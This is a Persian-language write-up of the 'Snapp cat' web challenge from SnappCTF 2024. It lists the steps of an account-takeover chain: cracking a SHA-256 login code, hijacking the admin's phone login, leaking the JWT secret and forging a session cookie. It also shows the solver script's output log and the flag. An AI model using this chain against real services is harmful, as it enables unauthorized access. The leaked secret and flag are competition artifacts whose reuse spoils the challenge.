---
tags:
  - SnappCTF
  - SnappCTF-2024
  - Swagger
  - JWT
  - Web
  - sha256
---

<h1 dir="ltr">Snapp cat</h1>

<figure markdown="span">

![snappcat.png](./snappcat.png)

</figure>

# قدم های حل چالش:
1. ثبت نام یک کاربر رندوم
2. دریافت کد sha256 برای لاگین کردن
3. کرک کردن کد sha256 برای لاگین شدن
4. جنریت کردن کد برای وریفای کردن ایمیل
5. گرفتن کد وریفای ایمیل در کوکی 
7. گرفتن شماره تلفن ادمین
8. فراید لاگین به وسیله شماره تلفن ادمین
9. ساختن یه گربه!
10. خوندن کد js سرور
11. دریافت کد سکرت json-web-token و ست کردن کوکی برای گرفتن فلگ


برای حل این سوال من یک اسکریپت پایتون آماده کردم که میتونین از روی اون سوال رو حل کنین و بررسی کنین که چه اتفاقی میوفته

- [snappcat.py](./snappcat.py){:download="snappcat.py"}

بعد از دانلود فایل پایتون:

```sh
$ python3 snappcat.py
[+] registering with 2af8ba4edba03309: 
[+] response:  {'success': True}
[+] logging in with 2af8ba4edba03309
[+] resposne:  {'success': True}
[+] login with phone: +987714270933
[+] response: 200
[+] crack the code for sha256:04dc6d4a58836dce23191b5025d392f911a58c61452c580f79c9ec53f86b1ee6
[+] code cracked: 3189328
[+] send code
[+] login-with-phone-callback response:  {'sucess': True}
[+] send verification email
[+] response: 200
[+] verify account
[+] response: 200
[+] login with phone: +133731333717
[+] response: 200
[+] crack the code for sha256:98fbf94b5485944c2325c846ec6234b6b7008c62dd2d17728b77ebef038ab5bd
[+] code cracked: 7494977
[+] send code
[+] login-with-phone-callback response:  {'sucess': True}
[+] whoami?:  {'data': {'userId': 1}, 'success': True}
[+] create cat
[+] cat created with id: 62fd96ac-d0fe-4632-b7be-d2e873471acc
[+] display and get created cat
----------------------------------------------------------------------------------------------------
JWT SECRET: omidvaram-to-ke-ino-mibini-developer-website-bashi-fd29293cdeaf70dc67b420e73a37e172
----------------------------------------------------------------------------------------------------
[+] update jwt session
[+] reading flag xd
FLAG: SNAPP{7dc998269394314896af6378f15c2c12}
```


??? success "FLAG :triangular_flag_on_post:"
    <div dir="ltr">`SNAPP{7dc998269394314896af6378f15c2c12}`</div>


!!! نویسنده
    [amir303](https://x.com/amir3O3)

